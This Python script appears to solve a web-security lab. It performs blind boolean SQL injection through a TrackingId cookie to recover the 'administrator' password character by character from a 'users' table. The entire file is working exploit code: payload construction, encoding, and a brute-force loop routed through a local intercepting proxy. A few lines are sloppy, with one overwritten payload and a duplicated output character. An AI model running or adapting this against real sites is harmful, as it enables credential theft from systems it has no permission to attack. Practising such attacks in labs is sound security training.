import sys
import requests
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : "http://127.0.0.1:8080",
           'https' : "http://127.0.0.1:8080"}


def sqli_password(url):
    password_extracted = ""
    
    for i in range(1, 21):
        for j in range(32, 126): #ASCII table for all special + all character
            sqli_payload = f"' AND (SELECT ascii(SUBSTRING(password,{i},1)) from users where username='administrator')={j} --"
            
            sqli_payload = f"' AND (SELECT ascii(SUBSTRING(password,{i},1)) from users where username='administrator')='{j}' --"
            
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            cookie = {'TrackingId': '8YnjhO7OjHw0Rjh0' + sqli_payload_encoded,
                      'session': 'aVUFise8zlUdk0AWnt8AjY3hf6wHUfjT'}
            
            r = requests.get(url, cookies=cookie, verify=False)
            
            if "Welcome" not in r.text:
                sys.stdout.write('\r' + password_extracted + chr(j))
                sys.stdout.flush()
            else:
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted + chr(j))
                sys.stdout.flush()
                break
            
            
    
    
def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: {sys.argv[0]} <url>")
        print(f" (+) Example: {sys.argv[0]} www.example.com")
        sys.exit(1)
        
    url = sys.argv[1]
    print(f"(+) Retrieving administrator password : ")
    sqli_password(url)
    
if __name__ == "__main__":
    main()